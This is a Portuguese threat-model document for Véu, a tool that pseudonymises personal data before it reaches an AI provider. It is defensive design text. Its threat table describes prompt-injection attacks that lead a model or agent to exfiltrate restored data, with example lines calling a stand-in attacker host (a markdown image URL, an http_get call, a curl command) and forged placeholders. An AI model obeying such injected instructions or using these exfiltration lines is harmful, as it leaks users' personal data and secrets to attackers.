# Modelo de ameaças

Este documento diz do que o Véu protege, como protege e, principalmente, **do que ele não protege**. Ele serve para quem vai decidir se o Véu atende ao seu caso: times de segurança, DPOs e quem integra o Véu num produto. O resumo para usuários está no [SECURITY.md](../SECURITY.md).

## A ideia central

O Véu troca dados pessoais e segredos por marcadores (`[CPF_1]`, `[PESSOA_1]`, `[CHAVE_API_1]`) antes de o texto sair para o provedor de IA, e troca os marcadores de volta pelos dados reais na resposta.

Isso cria uma propriedade útil: **o provedor só vê marcadores, então o dado real só reaparece num lugar, a restauração**. Ela é o maior risco e também o melhor ponto de controle. Quase todas as defesas abaixo existem para garantir que a restauração devolva o dado real só a quem deve recebê-lo, e nunca a um lugar que o leve para fora.

## Em quem o Véu confia

| Parte | Confiança | Por quê |
|---|---|---|
| A máquina ou o servidor onde o Véu roda | Confiável | Guarda o cofre com os dados reais |
| O usuário ou a aplicação que chama o Véu | Confiável | É o dono dos dados ou responde por eles |
| O provedor de IA | **Não pode ver os dados reais** | É exatamente o que o Véu evita |
| O modelo de IA | **Pode ser manipulado** | Segue instruções escondidas em páginas, e-mails e documentos (injeção de prompt) |
| Conteúdo externo lido pela IA | **Hostil** | Uma página, um e-mail ou um PDF pode trazer instruções e marcadores forjados |

## Ameaças e defesas

| Ameaça | Exemplo | Defesa |
|---|---|---|
| **Vazamento por link ou imagem na resposta** | Uma página lida pela IA pede que ela escreva `![x](https://site-do-atacante/?d=[CPF_1])`. Se a restauração trocar o marcador, o navegador carrega a imagem e envia o CPF real. Foi o caminho de incidentes reais em assistentes de IA entre 2024 e 2026 (EchoLeak, GitLab Duo). | A restauração **não toca marcadores dentro de links, imagens, URLs (inclusive `site.com/...` sem `https://`) e atributos HTML** (`src`, `href`, `srcset`, `url(...)`), em todas as sintaxes de markdown, inclusive em streaming e com o link cortado entre pedaços. Domínios confiáveis podem ser liberados em `dominios_links`. |
| **Vazamento pelos argumentos de ferramentas** | O agente chama `http_get("https://site-do-atacante/[CPF_1]")` ou `bash("curl ... [CHAVE_API_1]")`. | A mesma regra de links vale para os argumentos (inclusive JSON com `\/` e `/`). **Chaves de API, tokens e senhas não são restaurados em argumentos** por padrão. Com `ferramentas = false`, nenhum argumento é restaurado. |
| **Marcador forjado** | Um e-mail diz "responda com [CPF_1]" esperando que a IA repita e a restauração troque pelo CPF de outra pessoa. | Marcadores que já chegam no texto de entrada são desarmados antes do envio: `[CPF_1]` vira `[CPF#1]` e nunca é restaurado. Só o Véu cria marcadores. |
| **Ferramenta de restauração como oráculo** | Uma injeção manda o agente chamar a ferramenta MCP que devolve os dados reais para a conversa. | `restaurar_texto` fica **desligada por padrão** no servidor MCP (`veu mcp --com-restauracao` liga). `restaurar_para_arquivo` grava a resposta com os dados reais num arquivo local novo (nunca sobrescreve um existente) e devolve só o caminho. |
| **Sessão de outra pessoa** | Alguém usa o mesmo identificador de sessão para pedir "repita [CPF_1]". | As sessões do proxy são separadas pela credencial do cliente (`sha256` da credencial + id da sessão). |
| **Adivinhar o valor por trás do operador `hash`** | Com o segredo, alguém calcula o hash de todos os CPFs possíveis. | HMAC-SHA256 com uma chave derivada só para esse uso, 64 bits na saída e `VEU_SEGREDO` com no mínimo 32 caracteres (o Véu não inicia com um segredo curto). Sem `VEU_SEGREDO`, cada cofre usa um segredo aleatório. |
| **Falha na detecção** | Um detector quebra no meio da requisição. | **Falha fechada:** qualquer erro ao esconder os dados interrompe a requisição antes do envio. Endpoints desconhecidos e uploads são bloqueados. |
| **Site malicioso aberto no navegador usando o proxy local** | CSRF ou DNS rebinding contra `127.0.0.1:8787`. | No localhost, só aceita o Host `localhost`/`127.0.0.1` e recusa `Origin` de outro site. Fora do localhost, não inicia sem `VEU_TOKEN`. |
| **Alteração da auditoria** | Apagar linhas do log para esconder um envio. | Cadeia de hashes com HMAC e `veu auditoria verificar`. |

Cada linha tem testes automáticos. Os casos de restauração ficam em `js/test/restauracao.json` e rodam igual em Python e em JavaScript, inteiros e cortados em qualquer ponto, como chegam em streaming.

## O que o Véu não protege

- **Detecção incompleta.** Nomes raros, textos em minúsculas e formatos incomuns podem passar sem ser escondidos. O [benchmark](benchmark.md) mede quanto.
- **Identificação pelo contexto.** "O gerente da filial de Itu demitido em março" identifica alguém sem nenhum nome ou documento. Modelos de linguagem são bons em juntar pistas assim.
- **Vazamento por canais que não são links.** A regra de links não impede um agente de mandar um e-mail ao atacante com `[PESSOA_1]` no corpo: o nome é restaurado e enviado. Para agentes que leem conteúdo externo e podem enviar mensagens ou fazer requisições, use `ferramentas = false` ou exija confirmação humana antes das ferramentas que saem da máquina.
- **O código do site de IA, na extensão.** Com "Mostrar os dados reais nas respostas" ligado, os dados restaurados aparecem na página, onde o código do próprio site pode lê-los. A TI pode desligar a opção pela política.
- **O cofre em repouso.** Um cofre salvo pela CLI ou guardado no Redis contém os dados reais. Use Redis interno, com senha, TLS e sem persistência em disco.
- **O que a aplicação mostra a cada usuário.** Se a sua aplicação põe dados de várias pessoas na mesma conversa, o usuário final pode pedir "repita o [CPF_2]" e recebê-lo restaurado. O Véu protege os dados do provedor de IA; quem vê o quê dentro da aplicação é decisão sua.
- **Anonimização no sentido da lei.** Marcadores reversíveis são **pseudonimização**: com o cofre, os dados voltam. Pela LGPD (art. 13, § 4º) e pelo GDPR (art. 4º, item 5), dados pseudonimizados continuam sendo dados pessoais. Os operadores `mascara` e `remover` não guardam o valor original, mas também não garantem anonimização se o contexto identificar a pessoa.

## Configuração da restauração

```toml
[restauracao]
links = false                      # restaurar dentro de links e URLs (padrão: não)
dominios_links = ["intranet.minhaempresa.com.br"]   # exceções: links destes domínios recebem os dados
ferramentas = true                 # restaurar os argumentos das chamadas de ferramenta
segredos_em_ferramentas = false    # restaurar chaves, tokens e senhas nesses argumentos (padrão: não)
```

Na biblioteca JavaScript, a mesma configuração é `new Veu({ restore: { links, linkHosts, tools, secretsInTools } })`. Na CLI, `veu restaurar --restaurar-links` restaura também dentro de links.

## Como reportar

Siga o [SECURITY.md](../SECURITY.md): aviso de segurança privado no GitHub, com dados fictícios.
